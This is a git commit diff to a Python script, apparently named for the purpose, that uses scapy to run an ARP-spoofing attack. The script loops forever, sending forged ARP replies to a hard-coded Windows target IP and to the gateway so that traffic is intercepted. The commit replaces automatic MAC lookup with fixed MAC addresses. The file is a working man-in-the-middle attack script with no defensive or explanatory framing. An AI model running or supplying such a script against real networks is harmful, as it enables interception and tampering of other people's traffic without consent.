b493a21b3aea0b93415c805cfca3066ed6f2798e
corner-minded <kemokot63@gmail.com>
2025-07-20 10:34:42 -0400

    Update ARP-Spoofing-Script.py

--- ARP-Spoofing-Script.py
+++ ARP-Spoofing-Script.py
@@ -1,17 +1,18 @@
 from scapy.all import *
 import time
 
-target_ip = "10.15.50.228"    # Windows target
+target_ip = "10.15.50.228"    # New Windows target IP
 gateway_ip = "10.15.0.1"      # Gateway
 
-target_mac = getmacbyip(target_ip)
-gateway_mac = getmacbyip(gateway_ip)
+# REPLACE THESE WITH YOUR MACs!
+target_mac = "0A:81:28:FF:CE:9b"  # Windows target MAC
+gateway_mac = "0A:72:bA:0F:5D:5C" # Gateway MAC
 
 def spoof():
     while True:
-        # Poison target's ARP cache (claim to be the gateway)
+        # Poison target (claim to be the gateway)
         send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
-        # Poison gateway's ARP cache (claim to be the target)
+        # Poison gateway (claim to be the target)
         send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
         time.sleep(2)  # Send ARP replies every 2 seconds
 
